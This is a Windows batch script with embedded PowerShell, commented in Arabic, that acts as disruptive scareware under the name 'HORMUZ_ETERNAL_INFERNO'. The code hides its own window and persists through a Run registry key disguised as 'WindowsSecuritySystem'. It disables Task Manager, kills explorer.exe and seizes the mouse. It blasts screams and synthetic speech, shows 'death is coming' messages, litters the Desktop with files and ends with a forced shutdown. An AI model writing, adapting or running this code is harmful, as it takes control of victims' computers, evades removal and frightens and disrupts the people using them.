@echo off
:: [01: التخفي وطلب الصلاحيات - Stealth & Elevation]
:: الكود سيعيد تشغيل نفسه كمسؤول (Admin) وسيختفي تماماً من الشاشة
chcp 65001 >nul
if not "%1"=="p" (
    echo Set W=CreateObject("WScript.Shell") > "%temp%\h.vbs"
    echo W.Run chr(34) ^& "%~f0" ^& chr(34) ^& " p", 0 >> "%temp%\h.vbs"
    wscript "%temp%\h.vbs" & del "%temp%\h.vbs" & exit /b
)

:: [02: التشغيل الذاتي والتحصين - Persistence & Lockdown]
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSecuritySystem" /t REG_SZ /d "%~f0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul 2>&1

:: [03: محرك الرعب الصوتي (المعزوفة -> الصراخ -> الضحك -> 100 سؤال)]
start /b powershell -WindowStyle Hidden -Command "& {
    $s = New-Object -ComObject SAPI.SpVoice;
    $s.Volume = 100;

    # معزوفة الراعي الوحيد (James Last / Gheorghe Zamfir)
    [console]::beep(783, 600); [console]::beep(880, 600); [console]::beep(932, 1200);
    [console]::beep(880, 600); [console]::beep(783, 600); [console]::beep(698, 1200);

    # التحول التدريجي للصراخ (Scream)
    for ($i=1000; $i -le 8000; $i+=200) { [console]::beep($i, 50) };

    # الضحك الهستيري (Laughter)
    for ($i=1; $i -le 10; $i++) { [console]::beep(600, 100); [console]::beep(1000, 100); Start-Sleep -m 50 };

    # الـ 100 سؤال بنبرات متغيرة (The 100 Questions)
    for ($i=1; $i -le 100; $i++) {
        $s.Rate = (Get-Random -Min -10 -Max 10);
        $s.Speak('لماذا لا تضحك معي؟');
    }
}"

:: [04: مصفوفة الـ 100 ميزة (100 Features Matrix)]
powershell -WindowStyle Hidden -Command "Stop-Process -Name explorer -Force; for ($i=1; $i -le 100; $i++) { 
    # تحريك الماوس بجنون
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Max 1920),(Get-Random -Max 1080));
    
    # رسائل اللغات القديمة (هيروغليفية وفارسية)
    if ($i % 10 -eq 0) {
        $msg = @('𓅓𓅱𓏏 - الموت آتٍ', 'ستاره تو خاموش شد ⭐', 'Mors Vincit Omnia', 'Kur-nu-gi-a');
        $randomMsg = $msg[(Get-Random -Max 4)];
        start cmd /c \"msg * $randomMsg\";
    }

    # إنشاء ملفات اللعنة على سطح المكتب
    $path = [Environment]::GetFolderPath('Desktop') + '\Star_Ancient_' + $i + '.txt';
    '𓅓𓅱𓏏 ستاره تو خاموش شد ⭐' | Out-File $path;
    
    # وميض الشاشة والترددات
    [console]::beep((Get-Random -Min 100 -Max 4000), 30);
}"

:: [05: الكتابة الشبحية (Ghost Typing)]
start notepad.exe
timeout /t 2 >nul
powershell -Command "$w = New-Object -ComObject WScript.Shell; while(!$w.AppActivate('Notepad')){Sleep 1}; $m = 'لقد استيقظت لعنة هرمز.. 100 ميزة.. صراخ.. ضحك.. وسؤال واحد: لماذا لا تضحك معي؟.. نراك في مضيق هرمز. ⭐ 𓅓𓅱𓏏'; foreach($c in $m.ToCharArray()){$w.SendKeys($c); Start-Sleep -Milliseconds 60}"

:: [06: الانهيار النهائي - Final Collapse]
color 4f
cls
echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
echo !  [HORMUZ_ETERNAL_INFERNO]: PRO VERSION          !
echo !  [PERSISTENCE]: ACTIVE | [SOULS]: ARCHIVED      !
echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
echo !  Mors Vincit Omnia. ⭐ 𓅓𓅱𓏏                       !
echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

:: صوت الضحكة الأخيرة مع السؤال
powershell -Command "$s = New-Object -ComObject SAPI.SpVoice; $s.Rate = -5; $s.Speak('لماذا لا تضحك معي؟ هيهيهيهيهي')"

timeout /t 10 >nul
powershell -Command "wininit" >nul 2>&1
shutdown -s -f -t 00 -c "𓅓𓅱𓏏.. الختام في مضيق هرمز."